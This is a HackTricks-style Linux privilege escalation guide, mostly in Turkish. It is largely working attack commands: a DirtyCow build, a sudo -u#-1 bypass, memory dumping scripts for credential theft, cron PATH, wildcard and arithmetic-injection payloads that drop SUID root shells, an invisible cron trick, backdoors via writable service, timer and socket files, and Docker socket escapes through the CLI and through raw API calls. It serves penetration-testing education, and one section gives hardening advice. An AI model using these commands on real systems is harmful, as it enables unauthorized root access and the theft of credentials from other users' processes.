# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Hadi çalışan OS hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkenindeki herhangi bir klasörde yazma iznine sahipseniz** bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü ve escalate privileges için kullanılabilecek exploit olup olmadığını kontrol edin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir açık kernel listesi ve bazı zaten **compiled exploits** burada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **compiled exploits** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm açık kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victimde çalıştırın, sadece kernel 2.x için exploits kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda yer alan güvenlik açığı bulunan sudo sürümlerine göre:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün güvenlik açığına sahip olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

**smasher2 box of HTB**'yi, bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Neyin **mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer bir şey unmounted ise, onu mount etmeyi deneyebilir ve gizli bilgileri kontrol edebilirsiniz
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Kullanışlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı kernel exploit'lerini kullanmanız gerekiyorsa faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Zafiyetli Yazılımlar

Kurulu paketlerin ve servislerin **sürümlerini** kontrol edin. Örneğin, ayrıcalık yükseltmek (escalating privileges) için istismar edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli kurulu yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla gereksiz bilgiler göstereceğini unutmayın; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits için savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## İşlemler

Yürütülen **hangi işlemlerin** olduğunu inceleyin ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (örneğin tomcat root tarafından mı çalıştırılıyor?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca süreçlerin binaryleri üzerindeki privileges'ınızı kontrol edin; belki birini overwrite edebilirsiniz.

### Process monitoring

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında çalışan zafiyetli süreçleri tespit etmek için çok faydalı olabilir.

### Process memory

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde düz metin olarak** kaydeder.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir; bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha kullanışlıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da yetkisiz kullanıcınıza ait diğer süreçleri dump edemeyeceğiniz anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tüm süreçler aynı uid'ye sahip olduğu sürece debug edilebilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir ebeveyn süreç debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir; çünkü CAP_SYS_PTRACE yetkisi gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps** o işlemin sanal adres alanı içinde belleğin nasıl haritalandığını gösterir; ayrıca her bir haritalanmış bölgenin **izinlerini** gösterir. **mem** pseudo dosyası işlemin belleğinin kendisini açığa çıkarır. maps dosyasından hangi **bellek bölgelerinin okunabildiğini** ve bunların offsetlerini biliriz. Bu bilgiyi **mem dosyasında seek edip tüm okunabilir bölgeleri dump ederek** bir dosyaya kaydetmek için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının linux için yeniden tasarlanmış halidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökebilirsiniz
- Script A.5 - [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilirsiniz (bir sürecin memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory içinde kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten **düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) running as root – web tabanlı scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve ayrıcalıklı bir yükseltme için görev oluşturabilirsiniz.

Tipik zincir
- Loopback'a özel portu keşfedin (ör. 127.0.0.1:8000 gibi) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile tespit edin
- Kimlik bilgilerini operasyonel artefaktlarda bulun:
  - `zip -P <password>` içeren yedekler/scriptler
  - systemd unit içinde `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünel kurup giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell düşürür):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Bunu kullan:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI'yi root olarak çalıştırmayın; ayrı bir kullanıcı ile asgari izinler vererek kısıtlayın
- localhost'a bağlayın ve ek olarak erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit dosyalarına secret gömmekten kaçının; secret store'lar veya sadece root'a ait EnvironmentFile kullanın
- İstek üzerine çalıştırılan job'lar için audit/logging'i etkinleştirin



Herhangi bir zamanlanmış görevin zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir scriptten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Örneğin, _/etc/crontab_ içinde PATH şu şekilde bulunur: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalıklarına sahip olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı PATH ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\\
Böylece, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ile betik içinde wildcard kullanımı (Wildcard Injection)

Eğer root tarafından çalıştırılan bir betikte bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için sömürebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu tür bir yolun önünde bulunuyorsa** _**/some/path/\***_ **, bu zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde arithmetic evaluation'dan önce parameter expansion ve command substitution gerçekleştirir. Eğer bir root cron/parser, güvensiz log alanlarını okuyup bunları bir arithmetic context'e gönderiyorsa, bir saldırgan cron çalıştığında root olarak çalışacak bir command substitution $(...) enjekte edebilir.

- Neden çalışır: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalışır), kalan sayısal `0` ise aritmetik için kullanılır ve script hata olmadan devam eder.

- Tipik zayıf desen:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Ayrıştırılan loga saldırgan tarafından kontrol edilen metin yazdırın, böylece sayıya benzeyen alan bir command substitution içerir ve bir rakamla biter. Komutunuzun stdout'a yazdırmadığından emin olun (veya yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script, **tam erişiminiz olan bir dizin** kullanıyorsa, o dizini silmek ve kontrolünüzdeki bir scripti sağlayan başka bir dizine **symlink oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron görevleri

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri arayabilirsiniz. Belki bundan faydalanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izle**, **daha az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şu şekilde yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir cronjob oluşturmak mümkündür **yorumdan sonra bir carriage return koyarak** (yeni satır karakteri olmadan) ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin; yazabiliyorsanız, bunu **değiştirerek** servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuzun **çalıştırılmasını** sağlayabilirsiniz (makinenin yeniden başlatılmasını beklemeniz gerekebilir).  
Örneğin .service dosyasının içine backdoor'unuzu **`ExecStart=/tmp/script.sh`** olarak koyabilirsiniz.

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinleriniz** varsa, bunları backdoor koyacak şekilde değiştirebilir ve servisler yeniden çalıştırıldığında backdoor'lar da çalışır.

### systemd PATH - Göreli Yollar

systemd tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Yolun herhangi bir klasörüne **write** yapabildiğinizi fark ederseniz, muhtemelen **escalate privileges** yapabilirsiniz. Aşağıdaki gibi service configuration dosyalarında kullanılan **relative paths being used on service configurations** için arama yapmanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içine, **same name as the relative path binary** ile aynı ada sahip bir **executable** oluşturun; servisten zafiyetli eylemi (**Start**, **Stop**, **Reload**) çalıştırması istendiğinde, sizin **backdoor**'ınız çalıştırılacaktır (Ayrıcalıksız kullanıcılar genellikle servisleri başlatıp/durduramazlar, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutuna bakın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd birim dosyalarıdır; adları `**.timer**` ile biter ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik desteğe sahip olduklarından cron'a bir alternatif olarak kullanılabilir ve eşzamansız çalıştırılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebilirseniz, systemd.unit içindeki bazı mevcut öğeleri (örneğin `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Belgelendirmede Unit'in ne olduğu şöyle yazıyor:

> Zamanlayıcı sona erdiğinde etkinleştirilecek birim. Argüman, son eki ".timer" olmayan bir birim adıdır. Belirtilmezse, bu değer zamanlayıcı birimiyle aynı adı taşıyan, sadece ekleri farklı olan bir service olarak varsayılır. (Yukarıya bakınız.) Etkinleştirilen birim adı ile zamanlayıcı biriminin adı, ek hariç olmak üzere aynı isimde olması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Bir systemd unit'i (ör. `.service`) bulun; bu unit **yazılabilir bir binary çalıştırıyor**.
- **göreli bir yol çalıştıran** bir systemd unit'i bulun ve o yürütülebilir dosyayı taklit etmek için **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olun.

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer` komutuna bakın.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Unutmayın: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` yolunda ona bir symlink oluşturarak **aktif edilir**

## Soketler

Unix Domain Sockets (UDS), client-server modellerinde aynı veya farklı makinelerde süreçler arası **iletişim** sağlar. Bilgisayarlar arası iletişim için standart Unix dosya tanımlayıcılarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket`'a bakın.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır fakat özetle **nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası, vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve yalnızca bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'e iletilir** ve tüm bağlantılar için sadece bir service unit başlatılır. Bu değer, tek bir service unit'un koşulsuz olarak tüm gelen trafiği yönettiği datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan olarak false'dur**. Performans sebepleriyle yeni daemon'ların sadece `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinleme **sockets**/FIFO'lar oluşturulup bağlanmadan **önce** veya **sonra** sırasıyla **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalıdır, ardından process için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar kapatılıp kaldırılmadan **önce** veya **sonra** sırasıyla **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafiğe **aktif edilecek** service unit adını belirtir. Bu ayar sadece Accept=no olan soketler için izinlidir. Varsayılan olarak soketle aynı adı taşıyan service'i (sonek değiştirilecek şekilde) kullanır. Çoğu durumda bu seçeneği kullanmak gerekli olmamalıdır.

### Yazılabilir .socket dosyaları

Eğer bir **yazılabilir** `.socket` dosyası bulursanız `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilir** ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Not: Sistem bu socket dosyası yapılandırmasını kullanıyor olmalıdır, aksi takdirde backdoor çalıştırılmaz_

### Yazılabilir soketler

Eğer **herhangi bir yazılabilir socket** tespit ederseniz (_şimdi burada config `.socket` dosyalarından değil Unix Soketlerinden bahsediyoruz_), o soket ile **iletişim kurabilir** ve belki bir açığı istismar edebilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** requests olabileceğini unutmayın (_.socket files'dan değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki **bir güvenlik açığından faydalanabilirsiniz**.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur; güvence altına alınması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. İşte bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanızı sağlar.

#### **Using Docker API Directly**

Docker CLI mevcut değilse, Docker socket hâlâ Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun, böylece içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimi olan container içinde doğrudan komut çalıştırabilirsiniz.

### Others

Unutmayın ki docker socket üzerinde yazma izinlerine sahipseniz çünkü **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

